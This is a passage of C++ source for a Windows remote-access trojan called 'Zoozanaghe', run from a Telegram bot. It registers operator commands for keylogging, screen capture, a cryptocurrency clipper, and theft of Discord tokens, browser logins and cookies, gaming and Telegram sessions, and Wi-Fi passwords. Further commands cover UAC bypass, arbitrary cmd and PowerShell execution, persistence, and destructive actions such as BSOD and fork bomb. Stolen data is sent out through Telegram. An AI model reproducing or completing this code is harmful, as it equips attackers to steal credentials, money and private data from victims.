        curl_mime_free(mime);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    bool sendVideo(long long chatId, const string& videoPath, const string& caption = "", 
                  bool markdown = false) {
        lock_guard<mutex> lock(sendMutex);
        
        if (!fs::exists(videoPath)) return false;
        
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/sendVideo";
        
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;
        
        // Add chat_id
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, to_string(chatId).c_str(), CURL_ZERO_TERMINATED);
        
        // Add video
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "video");
        curl_mime_filedata(part, videoPath.c_str());
        
        // Add caption if provided
        if (!caption.empty()) {
            part = curl_mime_addpart(mime);
            curl_mime_name(part, "caption");
            string escapedCaption = markdown ? escapeMarkdown(caption) : caption;
            curl_mime_data(part, escapedCaption.c_str(), CURL_ZERO_TERMINATED);
            
            if (markdown) {
                part = curl_mime_addpart(mime);
                curl_mime_name(part, "parse_mode");
                curl_mime_data(part, "Markdown", CURL_ZERO_TERMINATED);
            }
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60);
        
        CURLcode res = curl_easy_perform(curl);
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    bool sendAudio(long long chatId, const string& audioPath, const string& caption = "", 
                  bool markdown = false) {
        lock_guard<mutex> lock(sendMutex);
        
        if (!fs::exists(audioPath)) return false;
        
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/sendAudio";
        
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part;
        
        // Add chat_id
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "chat_id");
        curl_mime_data(part, to_string(chatId).c_str(), CURL_ZERO_TERMINATED);
        
        // Add audio
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "audio");
        curl_mime_filedata(part, audioPath.c_str());
        
        // Add caption if provided
        if (!caption.empty()) {
            part = curl_mime_addpart(mime);
            curl_mime_name(part, "caption");
            string escapedCaption = markdown ? escapeMarkdown(caption) : caption;
            curl_mime_data(part, escapedCaption.c_str(), CURL_ZERO_TERMINATED);
            
            if (markdown) {
                part = curl_mime_addpart(mime);
                curl_mime_name(part, "parse_mode");
                curl_mime_data(part, "Markdown", CURL_ZERO_TERMINATED);
            }
        }
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30);
        
        CURLcode res = curl_easy_perform(curl);
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    bool sendLocation(long long chatId, double latitude, double longitude) {
        lock_guard<mutex> lock(sendMutex);
        
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/sendLocation";
        
        string postData = "chat_id=" + to_string(chatId) + 
                         "&latitude=" + to_string(latitude) + 
                         "&longitude=" + to_string(longitude);
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10);
        
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        return res == CURLE_OK;
    }
    
    Json::Value getUserProfilePhotos(long long userId) {
        CURL* curl = curl_easy_init();
        if (!curl) return Json::Value();
        
        string readBuffer;
        string url = "https://api.telegram.org/bot" + botToken + "/getUserProfilePhotos?user_id=" + 
                    to_string(userId);
        
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10);
        
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        if (res != CURLE_OK || readBuffer.empty()) {
            return Json::Value();
        }
        
        Json::Value root;
        Json::CharReaderBuilder builder;
        JSONCPP_STRING errors;
        stringstream ss(readBuffer);
        
        Json::parseFromStream(builder, ss, &root, &errors);
        return root;
    }
};

class ZoozanagheBot {
private:
    TelegramBot bot;
    long long adminId;
    atomic<bool> running;
    thread pollThread;
    mutex commandMutex;
    map<long long, string> userStates;
    
    map<string, function<void(long long, const vector<string>&)>> commands;
    map<string, string> commandDescriptions;
    
    void registerCommands() {
        // System Commands
        registerCommand("/start", "Start bot and show help", 
            [this](long long chatId, const vector<string>& args) {
                sendWelcome(chatId);
            });
        
        registerCommand("/help", "Show help message", 
            [this](long long chatId, const vector<string>& args) {
                sendHelp(chatId);
            });
        
        registerCommand("/sysinfo", "Get system information", 
            [this](long long chatId, const vector<string>& args) {
                getSystemInfo(chatId);
            });
        
        // Screenshot Commands
        registerCommand("/ss", "Take screenshot", 
            [this](long long chatId, const vector<string>& args) {
                takeScreenshot(chatId);
            });
        
        registerCommand("/screenrec", "Record screen (seconds)", 
            [this](long long chatId, const vector<string>& args) {
                int seconds = 10;
                if (!args.empty()) {
                    try { seconds = stoi(args[0]); } catch (...) {}
                }
                recordScreen(chatId, seconds);
            });
        
        // Monitor Control
        registerCommand("/monitorsoff", "Turn off monitors", 
            [this](long long chatId, const vector<string>& args) {
                turnOffMonitors(chatId);
            });
        
        registerCommand("/monitorson", "Turn on monitors", 
            [this](long long chatId, const vector<string>& args) {
                turnOnMonitors(chatId);
            });
        
        // Process Management
        registerCommand("/processes", "List running processes", 
            [this](long long chatId, const vector<string>& args) {
                listProcesses(chatId);
            });
        
        registerCommand("/kill", "Kill process by PID or name", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /kill <PID or process name>");
                    return;
                }
                killProcess(chatId, args[0]);
            });
        
        registerCommand("/suspend", "Suspend process by PID", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /suspend <PID>");
                    return;
                }
                try {
                    DWORD pid = stoul(args[0]);
                    if (SystemController::suspendProcess(pid)) {
                        bot.sendMessage(chatId, "✅ Process suspended");
                    } else {
                        bot.sendMessage(chatId, "❌ Failed to suspend process");
                    }
                } catch (...) {
                    bot.sendMessage(chatId, "❌ Invalid PID");
                }
            });
        
        registerCommand("/resume", "Resume process by PID", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /resume <PID>");
                    return;
                }
                try {
                    DWORD pid = stoul(args[0]);
                    if (SystemController::resumeProcess(pid)) {
                        bot.sendMessage(chatId, "✅ Process resumed");
                    } else {
                        bot.sendMessage(chatId, "❌ Failed to resume process");
                    }
                } catch (...) {
                    bot.sendMessage(chatId, "❌ Invalid PID");
                }
            });
        
        // System Control
        registerCommand("/bsod", "Trigger Blue Screen of Death", 
            [this](long long chatId, const vector<string>& args) {
                triggerBSOD(chatId);
            });
        
        registerCommand("/forkbomb", "Execute fork bomb", 
            [this](long long chatId, const vector<string>& args) {
                executeForkBomb(chatId);
            });
        
        registerCommand("/implode", "Self destruct", 
            [this](long long chatId, const vector<string>& args) {
                deleteSelf(chatId);
            });
        
        registerCommand("/uacbypass", "Attempt UAC bypass", 
            [this](long long chatId, const vector<string>& args) {
                bypassUAC(chatId);
            });
        
        // Audio Control
        registerCommand("/volume", "Set volume (0-100)", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /volume <0-100>");
                    return;
                }
                try {
                    int level = stoi(args[0]);
                    if (SystemController::setVolume(level)) {
                        bot.sendMessage(chatId, "🔊 Volume set to " + to_string(level) + "%");
                    } else {
                        bot.sendMessage(chatId, "❌ Failed to set volume");
                    }
                } catch (...) {
                    bot.sendMessage(chatId, "❌ Invalid volume level");
                }
            });
        
        registerCommand("/mute", "Mute volume", 
            [this](long long chatId, const vector<string>& args) {
                if (SystemController::muteVolume()) {
                    bot.sendMessage(chatId, "🔇 Volume muted");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to mute volume");
                }
            });
        
        registerCommand("/unmute", "Unmute volume", 
            [this](long long chatId, const vector<string>& args) {
                if (SystemController::unmuteVolume()) {
                    bot.sendMessage(chatId, "🔊 Volume unmuted");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to unmute volume");
                }
            });
        
        registerCommand("/tts", "Text to speech", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /tts <text>");
                    return;
                }
                string text;
                for (const auto& arg : args) text += arg + " ";
                if (SystemController::textToSpeech(text)) {
                    bot.sendMessage(chatId, "🗣️ Speaking: " + text);
                } else {
                    bot.sendMessage(chatId, "❌ Failed to perform TTS");
                }
            });
        
        // Network Commands
        registerCommand("/wifi", "Get WiFi passwords", 
            [this](long long chatId, const vector<string>& args) {
                getWiFiPasswords(chatId);
            });
        
        registerCommand("/websiteblock", "Block website", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /websiteblock <website>");
                    return;
                }
                if (SystemController::blockWebsite(args[0])) {
                    bot.sendMessage(chatId, "🚫 Website blocked: " + args[0]);
                } else {
                    bot.sendMessage(chatId, "❌ Failed to block website (need admin)");
                }
            });
        
        registerCommand("/websiteunblock", "Unblock website", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /websiteunblock <website>");
                    return;
                }
                if (SystemController::unblockWebsite(args[0])) {
                    bot.sendMessage(chatId, "✅ Website unblocked: " + args[0]);
                } else {
                    bot.sendMessage(chatId, "❌ Failed to unblock website (need admin)");
                }
            });
        
        // Data Extraction
        registerCommand("/discord", "Extract Discord tokens", 
            [this](long long chatId, const vector<string>& args) {
                extractDiscordTokens(chatId);
            });
        
        registerCommand("/grabbrowser", "Extract browser data", 
            [this](long long chatId, const vector<string>& args) {
                extractBrowserData(chatId);
            });
        
        registerCommand("/grabtelegram", "Extract Telegram sessions", 
            [this](long long chatId, const vector<string>& args) {
                extractTelegramSessions(chatId);
            });
        
        registerCommand("/grabsteam", "Extract Steam sessions", 
            [this](long long chatId, const vector<string>& args) {
                extractSteamSessions(chatId);
            });
        
        registerCommand("/grabminecraft", "Extract Minecraft sessions", 
            [this](long long chatId, const vector<string>& args) {
                extractMinecraftSessions(chatId);
            });
        
        // File Operations
        registerCommand("/ls", "List directory", 
            [this](long long chatId, const vector<string>& args) {
                string path = ".";
                if (!args.empty()) path = args[0];
                listDirectory(chatId, path);
            });
        
        registerCommand("/cd", "Change directory", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    char buffer[MAX_PATH];
                    GetCurrentDirectoryA(MAX_PATH, buffer);
                    bot.sendMessage(chatId, "📁 Current directory: " + string(buffer));
                } else {
                    if (SetCurrentDirectoryA(args[0].c_str())) {
                        char buffer[MAX_PATH];
                        GetCurrentDirectoryA(MAX_PATH, buffer);
                        bot.sendMessage(chatId, "✅ Changed to: " + string(buffer));
                    } else {
                        bot.sendMessage(chatId, "❌ Failed to change directory");
                    }
                }
            });
        
        registerCommand("/download", "Download file", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /download <file_path>");
                    return;
                }
                downloadFile(chatId, args[0]);
            });
        
        registerCommand("/upload", "Upload file (reply with file)", 
            [this](long long chatId, const vector<string>& args) {
                bot.sendMessage(chatId, "📤 Please reply with the file to upload");
                userStates[chatId] = "awaiting_upload";
            });
        
        registerCommand("/delete", "Delete file or directory", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /delete <path>");
                    return;
                }
                if (SystemController::deleteFile(args[0])) {
                    bot.sendMessage(chatId, "🗑️ Deleted: " + args[0]);
                } else {
                    bot.sendMessage(chatId, "❌ Failed to delete: " + args[0]);
                }
            });
        
        registerCommand("/encrypt", "Encrypt file", 
            [this](long long chatId, const vector<string>& args) {
                if (args.size() < 2) {
                    bot.sendMessage(chatId, "Usage: /encrypt <file_path> <key>");
                    return;
                }
                if (SystemController::encryptFile(args[0], args[1])) {
                    bot.sendMessage(chatId, "🔐 File encrypted: " + args[0]);
                } else {
                    bot.sendMessage(chatId, "❌ Failed to encrypt file");
                }
            });
        
        registerCommand("/decrypt", "Decrypt file", 
            [this](long long chatId, const vector<string>& args) {
                if (args.size() < 2) {
                    bot.sendMessage(chatId, "Usage: /decrypt <file_path> <key>");
                    return;
                }
                if (SystemController::decryptFile(args[0], args[1])) {
                    bot.sendMessage(chatId, "🔓 File decrypted: " + args[0]);
                } else {
                    bot.sendMessage(chatId, "❌ Failed to decrypt file");
                }
            });
        
        // System Commands
        registerCommand("/cmd", "Execute command", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /cmd <command>");
                    return;
                }
                string command;
                for (const auto& arg : args) command += arg + " ";
                executeCommand(chatId, command);
            });
        
        registerCommand("/powershell", "Execute PowerShell command", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /powershell <command>");
                    return;
                }
                string command = "powershell -Command \"" + args[0] + "\"";
                for (size_t i = 1; i < args.size(); i++) {
                    command += " " + args[i];
                }
                executeCommand(chatId, command);
            });
        
        // Input Control
        registerCommand("/blockinput", "Block keyboard and mouse input", 
            [this](long long chatId, const vector<string>& args) {
                if (SystemController::blockInput(true)) {
                    bot.sendMessage(chatId, "🖱️ Input blocked");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to block input");
                }
            });
        
        registerCommand("/unblockinput", "Unblock input", 
            [this](long long chatId, const vector<string>& args) {
                if (SystemController::blockInput(false)) {
                    bot.sendMessage(chatId, "🖱️ Input unblocked");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to unblock input");
                }
            });
        
        // Clipboard
        registerCommand("/clipboard", "Get clipboard content", 
            [this](long long chatId, const vector<string>& args) {
                string clipboard = SystemController::getClipboardText();
                if (clipboard.empty()) {
                    bot.sendMessage(chatId, "📋 Clipboard is empty");
                } else {
                    bot.sendMessage(chatId, "📋 Clipboard content:\n```\n" + clipboard + "\n```", true);
                }
            });
        
        registerCommand("/setclipboard", "Set clipboard text", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /setclipboard <text>");
                    return;
                }
                string text;
                for (const auto& arg : args) text += arg + " ";
                if (SystemController::setClipboardText(text)) {
                    bot.sendMessage(chatId, "✅ Clipboard set");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to set clipboard");
                }
            });
        
        registerCommand("/clipboardhistory", "Get clipboard history", 
            [this](long long chatId, const vector<string>& args) {
                vector<string> history = SystemController::getClipboardHistory();
                if (history.empty()) {
                    bot.sendMessage(chatId, "📋 No clipboard history");
                } else {
                    stringstream ss;
                    ss << "📋 Clipboard History:\n\n";
                    for (size_t i = 0; i < history.size(); i++) {
                        ss << i + 1 << ". " << history[i].substr(0, 50);
                        if (history[i].length() > 50) ss << "...";
                        ss << "\n";
                    }
                    bot.sendMessage(chatId, ss.str());
                }
            });
        
        // Keylogger
        registerCommand("/startkeylogger", "Start keylogger", 
            [this](long long chatId, const vector<string>& args) {
                if (SystemController::startKeylogger()) {
                    bot.sendMessage(chatId, "⌨️ Keylogger started");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to start keylogger");
                }
            });
        
        registerCommand("/stopkeylogger", "Stop keylogger", 
            [this](long long chatId, const vector<string>& args) {
                if (SystemController::stopKeylogger()) {
                    bot.sendMessage(chatId, "⌨️ Keylogger stopped");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to stop keylogger");
                }
            });
        
        registerCommand("/getkeylog", "Get keylog file", 
            [this](long long chatId, const vector<string>& args) {
                string logPath = Utils::getTempPath() + "\\keylog.txt";
                if (fs::exists(logPath)) {
                    bot.sendDocument(chatId, logPath, "⌨️ Keylog file");
                } else {
                    bot.sendMessage(chatId, "❌ No keylog file found");
                }
            });
        
        // Crypto Clipper
        registerCommand("/startclipper", "Start crypto clipper", 
            [this](long long chatId, const vector<string>& args) {
                map<string, string> replacements = {
                    {"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "YOUR_BTC_ADDRESS"}, // Bitcoin
                    {"0x742d35Cc6634C0532925a3b844Bc9eE0a43C2d8c", "YOUR_ETH_ADDRESS"} // Ethereum
                };
                
                if (SystemController::startCryptoClipper(replacements)) {
                    bot.sendMessage(chatId, "💰 Crypto clipper started");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to start crypto clipper");
                }
            });
        
        // System Management
        registerCommand("/startup", "Add to startup", 
            [this](long long chatId, const vector<string>& args) {
                if (Utils::createStartupShortcut()) {
                    bot.sendMessage(chatId, "✅ Added to startup");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to add to startup");
                }
            });
        
        registerCommand("/removestartup", "Remove from startup", 
            [this](long long chatId, const vector<string>& args) {
                if (Utils::removeStartupShortcut()) {
                    bot.sendMessage(chatId, "✅ Removed from startup");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to remove from startup");
                }
            });
        
        registerCommand("/critical", "Make process critical", 
            [this](long long chatId, const vector<string>& args) {
                if (PrivilegeManager::becomeCriticalProcess()) {
                    bot.sendMessage(chatId, "⚠️ Process is now critical");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to make process critical");
                }
            });
        
        registerCommand("/uncritical", "Remove critical status", 
            [this](long long chatId, const vector<string>& args) {
                if (PrivilegeManager::removeCriticalProcess()) {
                    bot.sendMessage(chatId, "✅ Process is no longer critical");
                } else {
                    bot.sendMessage(chatId, "❌ Failed to remove critical status");
                }
            });
        
        // Information Commands
        registerCommand("/ip", "Get IP address", 
            [this](long long chatId, const vector<string>& args) {
                bot.sendMessage(chatId, "🌐 IP Address: " + Utils::getIPAddress());
            });
        
        registerCommand("/mac", "Get MAC address", 
            [this](long long chatId, const vector<string>& args) {
                bot.sendMessage(chatId, "📡 MAC Address: " + Utils::getMACAddress());
            });
        
        registerCommand("/whoami", "Get user info", 
            [this](long long chatId, const vector<string>& args) {
                stringstream ss;
                ss << "👤 User Information:\n"
                   << "Username: " << Utils::getUserName() << "\n"
                   << "Computer: " << Utils::getComputerName() << "\n"
                   << "Admin: " << (PrivilegeManager::isRunningAsAdmin() ? "✅" : "❌") << "\n"
                   << "VM: " << (SystemController::isVirtualMachine() ? "✅" : "❌");
                bot.sendMessage(chatId, ss.str());
            });
        
        // Utility Commands
        registerCommand("/ping", "Ping test", 
            [this](long long chatId, const vector<string>& args) {
                bot.sendMessage(chatId, "🏓 Pong!");
            });
        
        registerCommand("/time", "Get current time", 
            [this](long long chatId, const vector<string>& args) {
                bot.sendMessage(chatId, "🕐 " + Utils::getCurrentTime());
            });
        
        registerCommand("/echo", "Echo text", 
            [this](long long chatId, const vector<string>& args) {
                if (args.empty()) {
                    bot.sendMessage(chatId, "Usage: /echo <text>");
                    return;
                }
                string text;
                for (const auto& arg : args) text += arg + " ";
                bot.sendMessage(chatId, text);
            });
    }
    
    void registerCommand(const string& command, const string& description, 
                        function<void(long long, const vector<string>&)> handler) {
        commands[command] = handler;
        commandDescriptions[command] = description;
    }
    
    void sendWelcome(long long chatId) {
        string welcome = 
            "👋 Welcome to *Zoozanaghe — 𐌅𐌋*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "*System Information:*\n"
            "• Computer: `" + Utils::getComputerName() + "`\n"
            "• User: `" + Utils::getUserName() + "`\n"
            "• IP: `" + Utils::getIPAddress() + "`\n"
            "• Admin: " + string(PrivilegeManager::isRunningAsAdmin() ? "✅" : "❌") + "\n"
            "• VM: " + string(SystemController::isVirtualMachine() ? "✅" : "❌") + "\n\n"
            "Use `/help` to see all commands.\n\n"
            "🌙 *Science without humanity is nothing but destruction.*";
        
        bot.sendMessage(chatId, welcome, true);
    }
    
    void sendHelp(long long chatId) {
        stringstream ss;
        ss << "📓 *Zoozanaghe — 𐌅𐌋*\n"
           << "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
           << "*Available Commands:*\n\n";
        
        map<string, vector<pair<string, string>>> categories = {
            {"🔧 System Control", {}},
            {"🖥️ Screen Control", {}},
            {"📊 Process Management", {}},
            {"🌐 Network & Data", {}},
            {"📁 File Operations", {}},
            {"🔐 Security", {}},
            {"⚙️ Utilities", {}}
        };
        
        for (const auto& [cmd, desc] : commandDescriptions) {
            if (cmd == "/start" || cmd == "/help" || cmd == "/ping") continue;
            
            if (cmd.find("/ss") == 0 || cmd.find("/screenrec") == 0 || 
                cmd.find("/monitors") == 0) {
                categories["🖥️ Screen Control"].push_back({cmd, desc});
            }
            else if (cmd.find("/process") == 0 || cmd.find("/kill") == 0 || 
                    cmd.find("/suspend") == 0 || cmd.find("/resume") == 0) {
                categories["📊 Process Management"].push_back({cmd, desc});
            }
            else if (cmd.find("/bsod") == 0 || cmd.find("/forkbomb") == 0 || 
                    cmd.find("/implode") == 0 || cmd.find("/uacbypass") == 0) {
                categories["🔧 System Control"].push_back({cmd, desc});
            }
            else if (cmd.find("/wifi") == 0 || cmd.find("/website") == 0 || 
                    cmd.find("/grab") == 0 || cmd.find("/discord") == 0) {
                categories["🌐 Network & Data"].push_back({cmd, desc});
            }
            else if (cmd.find("/ls") == 0 || cmd.find("/cd") == 0 || 
                    cmd.find("/download") == 0 || cmd.find("/upload") == 0 || 
                    cmd.find("/delete") == 0 || cmd.find("/encrypt") == 0) {
                categories["📁 File Operations"].push_back({cmd, desc});
            }
            else if (cmd.find("/blockinput") == 0 || cmd.find("/clipboard") == 0 || 
                    cmd.find("/keylogger") == 0 || cmd.find("/clipper") == 0 || 
                    cmd.find("/critical") == 0) {
                categories["🔐 Security"].push_back({cmd, desc});
            }
            else {
                categories["⚙️ Utilities"].push_back({cmd, desc});
            }
        }
        
        for (const auto& [category, cmds] : categories) {
            if (!cmds.empty()) {
                ss << "\n*" << category << "*\n";
                for (const auto& [cmd, desc] : cmds) {
                    ss << "`" << cmd << "` - " << desc << "\n";
                }
            }
        }
        
        ss << "\n━━━━━━━━━━━━━━━━━━━━━━━\n"
           << "*Usage Examples:*\n"
           << "• `/ss` - Take screenshot\n"
           << "• `/processes` - List processes\n"
           << "• `/wifi` - Get WiFi passwords\n"
           << "• `/cmd ipconfig` - Run command\n\n"
           << "📌 *Note:* Some commands require administrator privileges.";
        
        string helpText = ss.str();
        if (helpText.length() > 4000) {
            size_t pos = helpText.rfind("\n*", 3500);
            if (pos != string::npos) {
                string part1 = helpText.substr(0, pos);
                string part2 = helpText.substr(pos);
                bot.sendMessage(chatId, part1, true);
                bot.sendMessage(chatId, part2, true);
                return;
            }
        }
        
        bot.sendMessage(chatId, helpText, true);
    }
    
    void takeScreenshot(long long chatId) {
        string tempFile = Utils::getTempPath() + "\\screenshot.png";
        
        bot.sendMessage(chatId, "📸 Taking screenshot...");
        
        if (SystemController::takeScreenshot(tempFile)) {
            bot.sendPhoto(chatId, tempFile, "📸 Screenshot captured");
            fs::remove(tempFile);
        } else {
            bot.sendMessage(chatId, "❌ Failed to take screenshot");
        }
    }
    
    void recordScreen(long long chatId, int seconds) {
        string tempFile = Utils::getTempPath() + "\\screen_record.zip";
        
        bot.sendMessage(chatId, "🎥 Recording screen for " + to_string(seconds) + " seconds...");
        
        if (SystemController::recordScreen(tempFile, seconds)) {
            bot.sendDocument(chatId, tempFile, "🎥 Screen recording");
            fs::remove(tempFile);
        } else {
            bot.sendMessage(chatId, "❌ Failed to record screen");
        }
    }
    
    void turnOffMonitors(long long chatId) {
        if (SystemController::turnOffMonitors()) {
            bot.sendMessage(chatId, "🌑 Monitors turned OFF");
        } else {
            bot.sendMessage(chatId, "❌ Failed to turn off monitors");
        }
    }
    
    void turnOnMonitors(long long chatId) {
        if (SystemController::turnOnMonitors()) {
            bot.sendMessage(chatId, "💡 Monitors turned ON");
        } else {
            bot.sendMessage(chatId, "❌ Failed to turn on monitors");
        }
    }
    
    void listProcesses(long long chatId) {
        auto processes = SystemController::getProcesses();
        
        stringstream ss;
        ss << "📊 *Running Processes (" << processes.size() << "):*\n\n";
        
        int count = 0;
        for (const auto& [pid, name] : processes) {
            ss << "`" << pid << "` - " << name << "\n";
            count++;
            
            if (count >= 30) {
                ss << "\n... and " << (processes.size() - count) << " more";
                break;
            }
        }
        
        bot.sendMessage(chatId, ss.str(), true);
    }
    
    void killProcess(long long chatId, const string& target) {
        try {
            DWORD pid = stoul(target);
            if (SystemController::killProcess(pid)) {
                bot.sendMessage(chatId, "✅ Process " + target + " killed");
            } else {
                bot.sendMessage(chatId, "❌ Failed to kill process " + target);
            }
        } catch (...) {
            // Try by name
            if (SystemController::killProcessByName(target)) {
                bot.sendMessage(chatId, "✅ Process " + target + " killed");
            } else {
                bot.sendMessage(chatId, "❌ Failed to kill process " + target);
            }
        }
    }
    
    void triggerBSOD(long long chatId) {
        bot.sendMessage(chatId, "💀 Triggering BSOD...");
        SystemController::triggerBSOD();
    }
    
    void executeForkBomb(long long chatId) {
        bot.sendMessage(chatId, "💣 Executing fork bomb...");
        SystemController::executeForkBomb();
    }
    
    void deleteSelf(long long chatId) {
        bot.sendMessage(chatId, "🧨 Self-destructing...");
        SystemController::deleteSelf();
    }
    
    void bypassUAC(long long chatId) {
        if (SystemController::bypassUAC()) {
            bot.sendMessage(chatId, "✅ UAC bypass attempted");
        } else {
            bot.sendMessage(chatId, "❌ UAC bypass failed");
        }
    }
    
    void getWiFiPasswords(long long chatId) {
        auto wifiData = SystemController::getWiFiPasswords();
        
        if (wifiData.empty()) {
            bot.sendMessage(chatId, "❌ No WiFi profiles found");
            return;
        }
        
        stringstream ss;
        ss << "📶 *WiFi Passwords (" << wifiData.size() << " networks):*\n\n";
        
        for (const auto& [ssid, password] : wifiData) {
            ss << "📡 *" << ssid << "*\n🔑 `" << password << "`\n\n";
        }
        
        if (ss.str().length() > 4000) {
            string tempFile = Utils::getTempPath() + "\\wifi_passwords.txt";
            ofstream file(tempFile);
            for (const auto& [ssid, password] : wifiData) {
                file << ssid << ": " << password << "\n";
            }
            file.close();
            
            bot.sendMessage(chatId, "📶 Found " + to_string(wifiData.size()) + " WiFi networks");
            bot.sendDocument(chatId, tempFile, "📶 WiFi passwords");
            fs::remove(tempFile);
        } else {
            bot.sendMessage(chatId, ss.str(), true);
        }
    }
    
    void extractDiscordTokens(long long chatId) {
        bot.sendMessage(chatId, "🔍 Searching for Discord tokens...");
        
        auto tokens = DiscordTokenExtractor::extractAllTokens();
        
        if (tokens.empty()) {
            bot.sendMessage(chatId, "❌ No Discord tokens found");
            return;
        }
        
        int totalTokens = 0;
        for (const auto& [source, tokenList] : tokens) {
            totalTokens += tokenList.size();
        }
        
        stringstream ss;
        ss << "🔑 *Found " << totalTokens << " Discord tokens:*\n\n";
        
        for (const auto& [source, tokenList] : tokens) {
            if (!tokenList.empty()) {
                ss << "*" << source << "* (" << tokenList.size() << " tokens)\n";
                
                for (size_t i = 0; i < min(tokenList.size(), size_t(3)); i++) {
                    ss << "`" << tokenList[i].substr(0, 50) << "..." << "`\n";
                }
                
                if (tokenList.size() > 3) {
                    ss << "... and " << (tokenList.size() - 3) << " more\n";
                }
                
                ss << "\n";
            }
        }
        
        string tempFile = Utils::getTempPath() + "\\discord_tokens.txt";
        ofstream file(tempFile);
        
        for (const auto& [source, tokenList] : tokens) {
            file << "=== " << source << " ===\n\n";
            for (const auto& token : tokenList) {
                file << token << "\n\n";
            }
            file << "\n";
        }
        file.close();
        
        bot.sendMessage(chatId, ss.str(), true);
        bot.sendDocument(chatId, tempFile, "🔑 Discord tokens");
        fs::remove(tempFile);
    }
    
    void extractBrowserData(long long chatId) {
        bot.sendMessage(chatId, "🌍 Extracting browser data...");
        
        auto browserData = BrowserDataExtractor::extractAllBrowserData();
        
        if (browserData.empty()) {
            bot.sendMessage(chatId, "❌ No browser data found");
            return;
        }
        
        stringstream ss;
        ss << "🌐 *Browser Data Found:*\n\n";
        
        for (const auto& [browser, data] : browserData) {
            int totalItems = data.logins.size() + data.cookies.size();
            if (totalItems > 0) {
                ss << "*" << browser << "*\n"
                   << "• Logins: " << data.logins.size() << "\n"
                   << "• Cookies: " << data.cookies.size() << "\n\n";
            }
        }
        
        // Save to file
        string tempFile = Utils::getTempPath() + "\\browser_data.txt";
        ofstream file(tempFile);
        
        for (const auto& [browser, data] : browserData) {
            file << "=== " << browser << " ===\n\n";
            
            if (!data.logins.empty()) {
                file << "--- Saved Logins ---\n";
                for (const auto& login : data.logins) {
                    file << "URL: " << login.at("url") << "\n"
                         << "Username: " << login.at("username") << "\n"
                         << "Password: " << login.at("password") << "\n\n";
                }
            }
            
            if (!data.cookies.empty()) {
                file << "--- Cookies ---\n";
                for (const auto& cookie : data.cookies) {
